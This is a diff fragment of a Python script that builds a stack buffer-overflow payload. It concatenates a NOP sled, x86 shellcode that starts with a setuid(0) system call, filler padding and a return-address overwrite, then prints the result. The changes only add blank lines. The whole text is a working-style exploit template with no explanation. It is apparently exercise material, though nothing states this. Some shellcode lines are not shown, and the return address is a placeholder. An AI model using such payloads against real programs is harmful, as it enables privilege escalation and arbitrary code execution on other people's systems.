@@ -1,3 +1,4 @@
+
 nopsled = '\x90' * 64 
 shellcode = (
 '\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2' +
@@ -6,4 +7,5 @@ shellcode = (
 )
 padding = 'A' * (112 - 64 - 32)
 eip = '1234'
+
 print(nopsled + shellcode + padding + eip)
